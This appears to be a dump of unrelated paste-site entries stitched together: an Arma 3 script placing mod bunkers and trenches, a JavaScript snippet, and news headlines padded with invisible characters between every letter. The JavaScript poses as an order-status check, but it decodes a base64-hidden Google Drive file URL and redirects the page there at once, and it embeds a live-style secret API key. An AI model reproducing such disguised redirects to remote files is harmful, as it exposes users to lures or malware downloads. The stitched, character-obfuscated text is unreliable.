_object177 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object177 setVectorDirAndUp [[-0.929616,-0.368531,0],[0,0,1]];
_object177 setPosASL [5763.71,9280.84,136.367];


_object178 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object178 setVectorDirAndUp [[0.487362,0.8732,0],[0,0,1]];
_object178 setPosASL [5864.73,8593.57,129.269];


_object179 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object179 setVectorDirAndUp [[-0.487362,-0.8732,0],[0,0,1]];
_object179 setPosASL [5859.57,8589.92,129.269];


_object180 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object180 setVectorDirAndUp [[-0.8732,0.487362,0],[0,0,1]];
_object180 setPosASL [5856.41,8591.67,129.269];


_object181 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object181 setVectorDirAndUp [[0.873203,-0.487357,0],[0,0,1]];
_object181 setPosASL [5865.1,8599.83,129.269];


_object182 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object182 setVectorDirAndUp [[0.487362,0.8732,0],[0,0,1]];
_object182 setPosASL [5861.94,8601.58,129.269];


_object183 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object183 setVectorDirAndUp [[0.961202,0.275845,0],[0,0,1]];
_object183 setPosASL [5946.21,8291.95,137.408];


_object184 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object184 setVectorDirAndUp [[0.961202,0.275845,0],[0,0,1]];
_object184 setPosASL [5949.87,8299.6,137.408];


_object185 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object185 setVectorDirAndUp [[0.27585,-0.961201,0],[0,0,1]];
_object185 setPosASL [5950.88,8296.12,137.408];


_object186 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object186 setVectorDirAndUp [[-0.961202,-0.275844,0],[0,0,1]];
_object186 setPosASL [5939.97,8292.99,137.408];


_object187 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object187 setVectorDirAndUp [[-0.275845,0.961202,0],[0,0,1]];
_object187 setPosASL [5938.96,8296.46,137.408];


_object188 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object188 setVectorDirAndUp [[0.985104,0.171957,0],[0,0,1]];
_object188 setPosASL [5933.47,8922.37,145.858];


_object189 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object189 setVectorDirAndUp [[0.985104,0.171957,0],[0,0,1]];
_object189 setPosASL [5937.93,8929.58,145.858];


_object190 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object190 setVectorDirAndUp [[0.171962,-0.985104,0],[0,0,1]];
_object190 setPosASL [5938.56,8926.02,145.858];


_object191 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object191 setVectorDirAndUp [[-0.985105,-0.171956,0],[0,0,1]];
_object191 setPosASL [5927.38,8924.07,145.858];


_object192 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object192 setVectorDirAndUp [[-0.171957,0.985105,0],[0,0,1]];
_object192 setPosASL [5926.75,8927.63,145.858];


_object193 = createVehicle [""land_3AS_CIS_Wall_Door_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object193 setVectorDirAndUp [[-0.960497,-0.278291,0],[0,0,1]];
_object193 setPosASL [5999.8,7422.99,6.64377];


_object194 = createVehicle [""Land_Bunker_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object194 setVectorDirAndUp [[-0.278289,0.960497,0],[0,0,1]];
_object194 setPosASL [5982.76,7416.67,6.69071];


_object195 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object195 setVectorDirAndUp [[-0.960468,-0.278279,-0.00788433],[-0.00720662,-0.00345823,0.999968]];
_object195 setPosASL [5994.75,7414.87,6.71023];


_object196 = createVehicle [""3as_small_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object196 setVectorDirAndUp [[0.960485,0.278317,0.00296303],[-0.00778582,0.0162247,0.999838]];
_object196 setPosASL [5991.71,7427.9,6.56578];


_object197 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object197 setVectorDirAndUp [[0.960496,0.278293,0],[0,0,1]];
_object197 setPosASL [5969.88,7413.95,6.67999];


_object198 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object198 setVectorDirAndUp [[-0.278289,0.960497,0],[0,0,1]];
_object198 setPosASL [5986.67,7404.55,6.69901];


_object199 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object199 setVectorDirAndUp [[0.278293,-0.960496,0],[0,0,1]];
_object199 setPosASL [5979.27,7430.75,6.7061];


_object200 = createVehicle [""3as_planetaryshield_501w"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object200 setVectorDirAndUp [[0.262074,-0.965048,-3.33143e-008],[0.965048,0.262074,-1.14556e-008]];
_object200 setPosASL [5983.11,7418.02,-0.262512];


_object201 = createVehicle [""land_3AS_CIS_Ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object201 setVectorDirAndUp [[-0.960496,-0.278293,0],[0,0,1]];
_object201 setPosASL [5985.95,7426.25,6.56106];


_object202 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object202 setVectorDirAndUp [[-0.278289,0.960497,0],[0,0,1]];
_object202 setPosASL [5998.41,7409.02,6.69901];


_object203 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object203 setVectorDirAndUp [[0.960496,0.278293,0],[0,0,1]];
_object203 setPosASL [5974.35,7402.22,6.69901];


_object204 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object204 setVectorDirAndUp [[0.278293,-0.960496,0],[0,0,1]];
_object204 setPosASL [5967.55,7426.28,6.73084];


_object205 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object205 setVectorDirAndUp [[-0.960497,-0.278291,0],[0,0,1]];
_object205 setPosASL [5991.57,7433.15,6.6406];


_object206 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object206 setVectorDirAndUp [[0.960468,0.278351,0.0046084],[-0.0121093,0.0252343,0.999608]];
_object206 setPosASL [5985.46,7432.72,6.39999];


_object207 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object207 setVectorDirAndUp [[-0.960496,-0.278293,0],[0,0,1]];
_object207 setPosASL [5980.47,7402.57,6.69901];


_object208 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object208 setVectorDirAndUp [[0.958928,0.281009,0.0386107],[-0.0645731,0.0837222,0.994395]];
_object208 setPosASL [5972.81,7429.03,6.26397];


_object209 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object209 setVectorDirAndUp [[-0.960496,-0.278293,0],[0,0,1]];
_object209 setPosASL [5993.14,7406.25,6.69901];


_object210 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object210 setVectorDirAndUp [[-0.278929,0.96023,-0.0125312],[-0.0946542,-0.0145051,0.995405]];
_object210 setPosASL [5967.92,7420.16,6.47706];


_object211 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object211 setVectorDirAndUp [[-0.278289,0.960497,0],[0,0,1]];
_object211 setPosASL [5971.57,7407.48,6.69901];


_object212 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object212 setVectorDirAndUp [[0.826046,0.563603,0],[0,0,1]];
_object212 setPosASL [5976.08,8735.01,129.024];


_object213 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object213 setVectorDirAndUp [[0.826046,0.563603,0],[0,0,1]];
_object213 setPosASL [5977.16,8743.42,129.024];


_object214 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object214 setVectorDirAndUp [[0.563608,-0.826043,0],[0,0,1]];
_object214 setPosASL [5979.2,8740.44,129.024];


_object215 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object215 setVectorDirAndUp [[-0.826046,-0.563603,0],[0,0,1]];
_object215 setPosASL [5969.83,8734.04,129.024];


_object216 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object216 setVectorDirAndUp [[-0.563603,0.826046,0],[0,0,1]];
_object216 setPosASL [5967.79,8737.03,129.024];


_object217 = createVehicle [""3as_small_crate_stack_1_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object217 setVectorDirAndUp [[-0.986352,0.164622,0.00296303],[0,-0.0179961,0.999838]];
_object217 setPosASL [6025.73,8559.28,73.6168];


_object218 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object218 setVectorDirAndUp [[0.164649,0.986352,0],[0,0,1]];
_object218 setPosASL [6035.71,8551.32,73.7571];


_object219 = createVehicle [""land_3AS_CIS_Ramp_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object219 setVectorDirAndUp [[0.986352,-0.164648,0],[0,0,1]];
_object219 setPosASL [6031.64,8558.27,73.6121];


_object220 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object220 setVectorDirAndUp [[0.986352,-0.16465,0],[0,0,1]];
_object220 setPosASL [6023.58,8554.49,73.6916];


_object221 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object221 setVectorDirAndUp [[-0.986352,0.164584,0.0046084],[0,-0.0279894,0.999608]];
_object221 setPosASL [6029.27,8552.22,73.451];


_object222 = createVehicle [""land_3AS_CIS_Wall_Door_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object222 setVectorDirAndUp [[0.986352,-0.16465,0],[0,0,1]];
_object222 setPosASL [6020.56,8567.21,73.6948];


_object223 = createVehicle [""Land_Bunker_F"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object223 setVectorDirAndUp [[-0.164652,-0.986352,0],[0,0,1]];
_object223 setPosASL [6038.65,8565.53,73.7417];


_object224 = createVehicle [""3as_small_crate_stack_2_prop"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object224 setVectorDirAndUp [[0.986321,-0.164648,-0.00788435],[0.00799344,0,0.999968]];
_object224 setPosASL [6028.62,8572.34,73.7612];


_object225 = createVehicle [""3as_planetaryshield_501w"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object225 setVectorDirAndUp [[0.18124,0.983439,7.23912e-010],[-0.983439,0.18124,-7.92226e-009]];
_object225 setPosASL [6037.75,8564.46,66.7885];


_object226 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object226 setVectorDirAndUp [[-0.164652,-0.986352,0],[0,0,1]];
_object226 setPosASL [6027.85,8579.2,73.75];


_object227 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object227 setVectorDirAndUp [[0.986352,-0.164648,0],[0,0,1]];
_object227 setPosASL [6033.81,8579.42,73.75];


_object228 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object228 setVectorDirAndUp [[0.164649,0.986352,0],[0,0,1]];
_object228 setPosASL [6048.21,8550.28,73.7818];


_object229 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object229 setVectorDirAndUp [[-0.163959,-0.986388,-0.012531],[0.0916127,-0.0278736,0.995405]];
_object229 setPosASL [6050.52,8555.97,73.528];


_object230 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object230 setVectorDirAndUp [[-0.986114,0.161521,0.0386107],[0.0219955,-0.103418,0.994395]];
_object230 setPosASL [6042.28,8550.08,73.315];


_object231 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object231 setVectorDirAndUp [[-0.164652,-0.986352,0],[0,0,1]];
_object231 setPosASL [6040.38,8578.15,73.75];


_object232 = createVehicle [""land_3AS_CIS_Wall_Bunker_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object232 setVectorDirAndUp [[-0.986352,0.164648,0],[0,0,1]];
_object232 setPosASL [6051.44,8562.41,73.731];


_object233 = createVehicle [""land_3AS_CIS_Wall_Corner_v2"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object233 setVectorDirAndUp [[-0.986352,0.164648,0],[0,0,1]];
_object233 setPosASL [6052.49,8574.92,73.75];


_object234 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object234 setVectorDirAndUp [[0.986352,-0.164648,0],[0,0,1]];
_object234 setPosASL [6046.82,8577.25,73.75];


_object235 = createVehicle [""3AS_Metal_Trench_Short_Single"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object235 setVectorDirAndUp [[-0.164652,-0.986352,0],[0,0,1]];
_object235 setPosASL [6052.72,8568.97,73.75];


_object236 = createVehicle [""land_3AS_Bunker_Metal_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object236 setVectorDirAndUp [[0.962466,-0.271401,0],[0,0,1]];
_object236 setPosASL [6218,8673.57,120.95];


_object237 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object237 setVectorDirAndUp [[-0.962466,0.271402,0],[0,0,1]];
_object237 setPosASL [6213.25,8677.74,120.95];


_object238 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object238 setVectorDirAndUp [[0.962466,-0.271401,0],[0,0,1]];
_object238 setPosASL [6225.15,8678.14,120.95];


_object239 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object239 setVectorDirAndUp [[-0.271397,-0.962468,0],[0,0,1]];
_object239 setPosASL [6224.17,8674.66,120.95];


_object240 = createVehicle [""3AS_Metal_Trench_Corner_Snow"", [0, 0, 0], [], 0, ""CAN_COLLIDE""];
_object240 setVectorDirAndUp [[0.271401,0.962466,0],[0,0,1]];
_object240 setPosASL [6214.22,8681.22,120.95];"
G44JZPVJ,Untitled,WantingTrae,JavaScript,Saturday 5th of April 2025 02:21:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79958/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
R5bFKKwu,News April5 25,Newscaster_Ned,Email,Saturday 5th of April 2025 02:11:38 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

O‎h‎ ‎h‎e‎r‎e‎'‎s‎ ‎t‎h‎a‎t‎ ‎n‎e‎w‎s‎ ‎w‎h‎a‎t‎e‎v‎e‎r‎ ‎c‎r‎a‎p‎.‎

T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎P‎r‎a‎i‎s‎e‎d‎ ‎b‎y‎ ‎U‎.‎S‎.‎ ‎S‎h‎r‎i‎m‎p‎ ‎H‎a‎r‎v‎e‎s‎t‎e‎r‎s‎:‎ ‎H‎e‎ ‎'‎T‎h‎r‎e‎w‎ ‎U‎s‎ ‎A‎ ‎L‎i‎f‎e‎l‎i‎n‎e‎'‎
B‎o‎o‎k‎e‎r‎ ‎G‎i‎v‎e‎s‎ ‎S‎a‎f‎e‎ ‎A‎n‎s‎w‎e‎r‎ ‎t‎o‎ ‎W‎h‎e‎t‎h‎e‎r‎ ‎H‎e‎ ‎C‎o‎u‎l‎d‎ ‎L‎e‎a‎d‎ ‎S‎t‎r‎u‎g‎g‎l‎i‎n‎g‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎P‎a‎r‎t‎y‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎-‎-‎ ‎M‎c‎C‎o‎r‎m‎i‎c‎k‎:‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎J‎u‎s‎t‎ ‎O‎n‎e‎ ‎P‎a‎r‎t‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎'‎s‎ ‎E‎c‎o‎n‎o‎m‎i‎c‎ ‎A‎g‎e‎n‎d‎a‎
J‎u‎d‎g‎e‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎S‎e‎n‎t‎e‎n‎c‎e‎s‎ ‎M‎a‎n‎ ‎t‎o‎ ‎O‎n‎l‎y‎ ‎1‎0‎ ‎D‎a‎y‎s‎ ‎f‎o‎r‎ ‎P‎r‎o‎-‎H‎a‎m‎a‎s‎ ‎G‎r‎a‎f‎f‎i‎t‎i‎
N‎e‎v‎e‎r‎ ‎T‎r‎u‎m‎p‎e‎r‎s‎:‎ ‎T‎r‎u‎m‎p‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎a‎r‎e‎ ‎t‎h‎e‎ ‎E‎n‎d‎ ‎o‎f‎ ‎‘‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎E‎m‎p‎i‎r‎e‎’‎
D‎a‎v‎i‎d‎ ‎M‎c‎C‎o‎r‎m‎i‎c‎k‎:‎ ‎M‎e‎n‎t‎o‎r‎i‎n‎g‎ ‎K‎e‎y‎ ‎t‎o‎ ‎U‎n‎l‎o‎c‎k‎i‎n‎g‎ ‎L‎e‎a‎d‎e‎r‎s‎h‎i‎p‎ ‎f‎o‎r‎ ‎N‎e‎x‎t‎ ‎G‎e‎n‎e‎r‎a‎t‎i‎o‎n‎
A‎g‎r‎e‎d‎e‎n‎ ‎a‎ ‎P‎e‎r‎i‎o‎d‎i‎s‎t‎a‎ ‎q‎u‎e‎ ‎E‎x‎h‎i‎b‎i‎ó‎ ‎C‎á‎m‎a‎r‎a‎s‎ ‎e‎n‎ ‎B‎a‎ñ‎o‎ ‎d‎e‎ ‎C‎D‎M‎X‎
E‎x‎-‎A‎s‎s‎i‎s‎t‎a‎n‎t‎ ‎S‎a‎y‎s‎ ‎F‎i‎l‎m‎m‎a‎k‎e‎r‎ ‎P‎a‎u‎l‎ ‎S‎c‎h‎r‎a‎d‎e‎r‎ ‎S‎e‎x‎u‎a‎l‎l‎y‎ ‎A‎s‎s‎a‎u‎l‎t‎e‎d‎ ‎H‎e‎r‎
M‎e‎x‎i‎c‎a‎n‎ ‎J‎o‎u‎r‎n‎a‎l‎i‎s‎t‎ ‎A‎s‎s‎a‎u‎l‎t‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎E‎x‎p‎o‎s‎i‎n‎g‎ ‎C‎a‎m‎e‎r‎a‎s‎ ‎I‎n‎s‎i‎d‎e‎ ‎W‎o‎m‎e‎n‎’‎s‎ ‎B‎a‎t‎h‎r‎o‎o‎m‎
1‎3‎3‎ ‎I‎l‎l‎e‎g‎a‎l‎ ‎A‎l‎i‎e‎n‎s‎ ‎B‎u‎s‎t‎e‎d‎ ‎i‎n‎ ‎N‎e‎w‎ ‎Y‎o‎r‎k‎ ‎D‎e‎p‎o‎r‎t‎a‎t‎i‎o‎n‎ ‎O‎p‎e‎r‎a‎t‎i‎o‎n‎
N‎o‎l‎t‎e‎:‎ ‎C‎N‎N‎L‎O‎L‎ ‎W‎i‎p‎e‎d‎ ‎O‎u‎t‎ ‎(‎A‎g‎a‎i‎n‎)‎ ‎i‎n‎ ‎Q‎u‎a‎r‎t‎e‎r‎l‎y‎ ‎R‎a‎t‎i‎n‎g‎s‎
B‎a‎c‎k‎s‎t‎r‎e‎e‎t‎ ‎B‎o‎y‎ ‎B‎r‎i‎a‎n‎ ‎L‎i‎t‎t‎r‎e‎l‎l‎'‎s‎ ‎S‎o‎n‎ ‎P‎e‎r‎f‎o‎r‎m‎s‎ ‎F‎a‎i‎t‎h‎ ‎S‎o‎n‎g‎ ‎a‎t‎ ‎'‎A‎m‎e‎r‎i‎c‎a‎n‎ ‎I‎d‎o‎l‎'‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
E‎x‎c‎l‎u‎s‎i‎v‎e‎ ‎—‎ ‎S‎e‎n‎.‎ ‎D‎a‎v‎i‎d‎ ‎M‎c‎C‎o‎r‎m‎i‎c‎k‎:‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎‘‎J‎u‎s‎t‎ ‎O‎n‎e‎ ‎C‎h‎a‎p‎t‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎B‎o‎o‎k‎ ‎o‎f‎ ‎t‎h‎e‎ ‎T‎r‎u‎m‎p‎ ‎E‎c‎o‎n‎o‎m‎i‎c‎ ‎A‎g‎e‎n‎d‎a‎’‎

D‎e‎r‎e‎g‎u‎l‎a‎t‎i‎o‎n‎,‎ ‎E‎n‎e‎r‎g‎y‎ ‎D‎o‎m‎i‎n‎a‎n‎c‎e‎,‎ ‎T‎a‎x‎ ‎C‎u‎t‎s‎ ‎W‎i‎l‎l‎ ‎A‎l‎s‎o‎ ‎M‎a‎k‎e‎ ‎A‎m‎e‎r‎i‎c‎a‎ ‎G‎r‎e‎a‎t‎ ‎A‎g‎a‎i‎n‎
P‎H‎I‎L‎A‎D‎E‎L‎P‎H‎I‎A‎,‎ ‎P‎A‎ ‎-‎ ‎M‎A‎R‎C‎H‎ ‎2‎2‎:‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎n‎d‎ ‎P‎e‎n‎n‎s‎y‎l‎v‎a‎n‎i‎a‎ ‎S‎e‎n‎a‎t‎o‎r‎ ‎D‎a‎v‎i‎d‎ ‎M‎c‎C‎o‎r‎m‎i‎
T‎a‎r‎i‎f‎f‎s‎ ‎a‎r‎e‎ ‎j‎u‎s‎t‎ ‎“‎o‎n‎e‎ ‎c‎h‎a‎p‎t‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎b‎o‎o‎k‎ ‎o‎f‎ ‎t‎h‎e‎ ‎T‎r‎u‎m‎p‎ ‎e‎c‎o‎n‎o‎m‎i‎c‎ ‎a‎g‎e‎n‎d‎a‎,‎”‎ ‎S‎e‎n‎.‎ ‎D‎a‎v‎i‎d‎ ‎M‎c‎C‎o‎r‎m‎i‎c‎k‎ ‎(‎R‎-‎P‎A‎)‎ ‎s‎a‎i‎d‎ ‎d‎u‎r‎i‎n‎g‎ ‎a‎n‎ ‎a‎p‎p‎e‎a‎r‎a‎n‎c‎e‎ ‎o‎n‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎S‎a‎t‎u‎r‎d‎a‎y‎,‎ ‎d‎i‎s‎c‎u‎s‎s‎i‎n‎g‎ ‎t‎a‎r‎i‎f‎f‎s‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎a‎t‎e‎s‎t‎ ‎j‎o‎b‎s‎ ‎n‎u‎m‎b‎e‎r‎s‎.‎

T‎r‎u‎m‎p‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎e‎s‎ ‎C‎h‎i‎n‎a‎,‎ ‎H‎o‎n‎g‎ ‎K‎o‎n‎g‎ ‎T‎r‎a‎d‎e‎ ‎E‎x‎e‎m‎p‎t‎i‎o‎n‎s‎ ‎t‎o‎ ‎C‎o‎m‎b‎a‎t‎ ‎I‎l‎l‎i‎c‎i‎t‎ ‎S‎u‎b‎s‎t‎a‎n‎c‎e‎ ‎I‎m‎p‎o‎r‎t‎s‎
T‎r‎u‎m‎p‎ ‎E‎l‎i‎m‎i‎n‎a‎t‎e‎s‎ ‎C‎h‎i‎n‎a‎ ‎T‎r‎a‎d‎e‎ ‎E‎x‎e‎m‎p‎t‎i‎o‎n‎s‎ ‎t‎o‎ ‎C‎o‎m‎b‎a‎t‎ ‎S‎u‎b‎s‎t‎a‎n‎c‎e‎ ‎I‎m‎p‎o‎r‎t‎s‎
4‎,‎3‎4‎8‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎8‎ ‎D‎e‎a‎d‎,‎ ‎D‎o‎z‎e‎n‎s‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎i‎n‎ ‎R‎u‎s‎s‎i‎a‎n‎ ‎M‎i‎s‎s‎i‎l‎e‎ ‎S‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎1‎8‎ ‎D‎e‎a‎d‎,‎ ‎D‎o‎z‎e‎n‎s‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎i‎n‎ ‎R‎u‎s‎s‎i‎a‎n‎ ‎M‎i‎s‎s‎i‎l‎e‎ ‎S‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎U‎k‎r‎a‎i‎n‎e‎
1‎,‎3‎0‎1‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎D‎i‎g‎e‎s‎t‎:‎ ‎T‎h‎e‎ ‎M‎a‎r‎k‎e‎t‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎R‎e‎a‎l‎i‎z‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎M‎e‎a‎n‎t‎ ‎I‎t‎
B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎D‎i‎g‎e‎s‎t‎:‎ ‎T‎h‎e‎ ‎M‎a‎r‎k‎e‎t‎ ‎F‎i‎n‎a‎l‎l‎y‎ ‎R‎e‎a‎l‎i‎z‎e‎d‎ ‎T‎r‎u‎m‎p‎ ‎M‎e‎a‎n‎t‎ ‎I‎t‎
1‎,‎5‎0‎4‎
